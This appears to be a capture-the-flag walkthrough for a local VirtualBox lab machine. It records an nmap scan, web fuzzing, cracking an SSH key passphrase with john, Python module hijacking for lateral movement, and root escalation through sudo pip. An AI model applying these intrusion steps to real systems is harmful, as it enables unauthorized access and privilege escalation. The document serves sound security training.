# Nmap

```bash
# Nmap 7.94SVN scan initiated Mon Nov 25 13:25:03 2024 as: /usr/lib/nmap/nmap --privileged -p 22,80 -sCV -A -T4 -oN scans/service-scan -v 192.168.56.104
Nmap scan report for 192.168.56.104
Host is up (0.00076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesnt have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
MAC Address: 08:00:27:5D:B9:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Uptime guess: 12.899 days (since Tue Nov 12 15:50:04 2024)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.76 ms 192.168.56.104

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 25 13:25:12 2024 -- 1 IP address (1 host up) scanned in 8.89 seconds
```

### Services

**HTTP (80):**
	[http://192.168.56.104/](http://192.168.56.104/) Comments in the source code available
	[http://192.168.56.104/robots.txt](http://192.168.56.104/robots.txt) - ~myfiles
	[http://192.168.56.104/~myfiles/](http://192.168.56.104/~myfiles/) - Fake 404 Error code. Comments in the source code available
	[http://192.168.56.104/~secret/](http://192.168.56.104/~secret/) - Found by fuzzing with BurpSuite
	[http://192.168.56.104/~secret/.mysecret.txt](http://192.168.56.104/~secret/.mysecret.txt) - Found by fuzzing with BurpSuite
	        With [https://www.dcode.fr/identificador-cifrado](https://www.dcode.fr/identificador-cifrado) we found that it is base58, decoding it we get a ssh private key, which we have to crack it with ssh2john and johntheripper
	            - Commands to crack passphrase: (P@55w0rd!)
	                `ssh2john private-key > private-key.hash`
	                `john private-key.hash --wordlist=/usr/share/wordlists/fasttrack.txt`

**SSH:**
    - `ssh -i private-key icex64@192.168.56.104` (Enter cracked passphrase)

### Lateral movement

With `sudo -l` we find that we can execute script `/home/arsene/heist.py` as arsene. This script import python module `webbrowser` which is located in `/usr/lib/python3.9/webbrowser.py` and after check we confirm that we have write access, so we can perform module hijacking:

![[Pasted image 20241126111537.png]]

Launch the script and get a shell as arsene:
	`sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py`

### Privilege escalation

With `sudo -l` as arsene we find that we can execute pip as sudo. With GTFOBins we found **[this](https://gtfobins.github.io/gtfobins/pip/#sudo)** escalation method.

And we are root